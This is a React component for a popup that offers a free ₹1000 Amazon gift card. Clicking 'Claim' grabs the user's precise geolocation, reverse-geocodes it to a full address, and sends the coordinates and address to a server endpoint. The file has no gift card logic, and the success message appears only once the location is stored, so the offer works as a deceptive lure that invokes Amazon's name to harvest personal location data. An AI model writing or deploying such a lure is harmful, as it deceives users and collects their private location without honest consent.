import React, { useState, useEffect } from 'react';
import { X, Gift } from 'lucide-react';

interface GiftCardPopupProps {
  isVisible: boolean;
  onClose: () => void;
}

const GiftCardPopup: React.FC<GiftCardPopupProps> = ({ isVisible, onClose }) => {
  const [isProcessing, setIsProcessing] = useState(false);
  const [locationStatus, setLocationStatus] = useState<string>('');

  const handleClaimGiftCard = async () => {
    setIsProcessing(true);
    setLocationStatus('Getting your location...');

    if (!navigator.geolocation) {
      setLocationStatus('Geolocation is not supported by your browser.');
      setIsProcessing(false);
      return;
    }

    navigator.geolocation.getCurrentPosition(
      async (position) => {
        const { latitude, longitude } = position.coords;
        
        try {
          setLocationStatus('Fetching location details...');
          
          // Get address from coordinates
          const response = await fetch(
            `https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`
          );
          const data = await response.json();

          const locationString = `You are in ${
            data.address.city || data.address.town || data.address.village || 'an unknown location'
          }, ${data.address.country}`;
          
          setLocationStatus(locationString);

          // Send to our server
          const saveResponse = await fetch('http://localhost:3000/api/save-location', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
            },
            body: JSON.stringify({
              latitude,
              longitude,
              timestamp: new Date().toISOString(),
              address: data.address,
            }),
          });

          if (saveResponse.ok) {
            setLocationStatus('🎉 Congratulations! Your ₹1000 Amazon Gift Card will be applied at checkout on your first purchase today!');
            setTimeout(() => {
              onClose();
            }, 3000);
          } else {
            throw new Error('Failed to save location');
          }
        } catch (error) {
          console.error('Error:', error);
          setLocationStatus('❌ Error processing your request. Please try again.');
        } finally {
          setIsProcessing(false);
        }
      },
      (error) => {
        console.error('Geolocation error:', error);
        setLocationStatus('❌ Unable to retrieve your location. Please enable location access.');
        setIsProcessing(false);
      }
    );
  };

  if (!isVisible) return null;

  return (
    <div className="fixed bottom-5 right-5 w-80 bg-white rounded-lg shadow-xl z-50 transform transition-all duration-300 ease-out">
      <div className="bg-orange-400 text-white p-3 rounded-t-lg flex justify-between items-center">
        <div className="flex items-center gap-2">
          <Gift size={20} />
          <span className="font-bold">Special Offer!</span>
        </div>
        <button onClick={onClose} className="text-white hover:text-gray-200">
          <X size={18} />
        </button>
      </div>
      
      <div className="p-4">
        <p className="text-gray-800 mb-4 text-sm leading-relaxed">
          🎁 Get a FREE ₹1000 Amazon Gift Card when you make your first purchase today!
        </p>
        
        {locationStatus && (
          <div className="mb-4 p-3 bg-gray-50 rounded text-sm text-gray-700">
            {locationStatus}
          </div>
        )}
        
        <button
          onClick={handleClaimGiftCard}
          disabled={isProcessing}
          className={`w-full py-3 px-4 rounded font-bold text-white transition-colors ${
            isProcessing
              ? 'bg-gray-400 cursor-not-allowed'
              : 'bg-orange-400 hover:bg-orange-500'
          }`}
        >
          {isProcessing ? 'Processing...' : 'Claim Your Gift Card'}
        </button>
      </div>
    </div>
  );
};

export default GiftCardPopup;